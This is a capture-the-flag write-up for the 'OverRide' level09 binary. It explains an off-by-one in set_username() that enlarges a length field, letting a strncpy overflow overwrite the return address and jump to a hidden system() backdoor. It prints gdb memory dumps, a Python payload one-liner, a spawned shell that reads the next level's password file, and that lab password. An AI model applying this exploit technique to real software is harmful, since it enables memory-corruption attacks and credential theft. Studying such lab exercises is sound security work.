# Level 09

<h3>source.c</h3>

```console
The source for this program is quite long
So i will not include it in this file, and can be check in the source.c directly if needed
```

<h3>Analysis</h3>

At 1st glance, this program does almost nothing, but upon investigate further on the code, we can see that there is a flow.

Before we talk about the flaw, lets talk about the `struct s_msg` that exist in this code, base on the clue in the asm, there exit a `struct` like data type

After fixing all the clue together, we will get a `struct` that looks like this

```console
typedef struct	s_msg {   -> total size 192 base on the buffer in handle_msg
	char		msg[140];       -> [0x0]
	char		username[40];   -> [0x8c]
	size_t	len;            -> [0xb4]
}				        t_msg;
```

Now we can talk about the flaw which exits in the `set_username()`,

The function will get input with fgets and will then copy it into the struct->username with a loop and the ending condition is this `while (index < 41 && str[index] != '\0')`

From the struct, we can see that `username` is designed to be only `40 bytes` long, and the loop ending condition is `< 41` which means we could write into `struct->username[40]`

But the end of the `struct->username` should be at `index 39`, `index 40` will write directly on the memory area that are supposed to be for `struct->len`

Now we can take a look at `set_msg()`

```console
fgets(str, 1024, stdin);
strncpy(msg->msg, str, msg->len);
```

The functions can read up to `1024 bytes` from `stdin`, but the copy is limited to the `struct->len` which was initialize as `140` at the `handle_msg()`

By using the flaw, we can change the number of `struct->len`, and we could ends up writing a lot more data into `struct->msg` which could ends up overwriting the `RET` address!

The last part will be `secret_backdoor()` which is not called by any of the function, but exits in the code

```console
void secret_backdoor(void) {
	char str[128];

	fgets(str, 128, stdin); 
	system(str);
}
```

This function will call `system()` with any input that we give in the stdin, so we put `/bin/sh` and we could spawn a shell

Our final target of this project is to overwrite the `RET` and point it into the address of `secret_backdoor()`

<h3>Exploit</h3>

Lets find out what will be the offset to reach the `RET`

```console
(gdb) break *0x000055555555492b     -> breakpoint at the end of handle_msg()

(gdb) r
Starting program: /home/users/level09/level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: aaaa
>: Welcome, aaaa
>: Msg @Unix-Dude
>>: bbbb

Breakpoint 1, 0x000055555555492b in handle_msg ()

(gdb) info r
rax            0x7fffffffe4c0	140737488348352
rbx            0x0	0
rcx            0x7ffff7ab32e0	140737348580064
rdx            0x0	0
rsi            0x6	6
rdi            0x555555554bc0	93824992234432
rbp            0x7fffffffe580	0x7fffffffe580
rsp            0x7fffffffe4c0	0x7fffffffe4c0

(gdb) x/100wx $rsp
0x7fffffffe4c0:	0x62626262	0x0000000a	0x00000000	0x00000000    -> `0x7fffffffe4c0` start of the struct, and the 1st will be struct->msg, and we can see that our input bbbb is there
0x7fffffffe4d0:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe4e0:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe4f0:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe500:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe510:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe520:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe530:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe540:	0x00000000	0x00000000	0x00000000	0x61616161    -> `0x7fffffffe54c` here will be struct->username, and we can see that our input aaaa is there
0x7fffffffe550:	0x0000000a	0x00000000	0x00000000	0x00000000
0x7fffffffe560:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe570:	0x00000000	0x0000008c	0xffffe590	0x00007fff    -> `0x7fffffffe574` here will be struct->len, and we can see that 0x8c or 140 is there
0x7fffffffe580:	0xffffe590	0x00007fff	0x55554abd	0x00005555    ->  base on info register, we can see that rbp is located at `0x7fffffffe580` and as usual, RET should be right after that
```

From the debugging above, we can find `RET` address is located at `0x7fffffffe588` and the `struct->msg` is at `0x7fffffffe4c0` and the distance will be `0xc8` or `200 bytes`

```console
(gdb) p secret_backdoor
$1 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
```

Now we have the address of the `secret_backdoor()` as well, time to build our payload!

```console
1st input for username = "a" * 40 + "\xff" + "\n"
"\xff" = 255, is used to overwrite struct->len

2nd input for message = "a" * 200  + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "\n"
```

```console
level09@OverRide:~$ python -c 'print "a" * 40 + "\xff" + "\n" + "a" * 200  + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "\n" + "/bin/sh"' > /tmp/a
level09@OverRide:~$ cat /tmp/a - | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�>: Msg @Unix-Dude
>>: >: Msg sent!
/bin/sh
whoami
end
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE

level09@OverRide:~$ su end
Password:
end@OverRide:~$ ls
end
end@OverRide:~$ cat end
GG !
```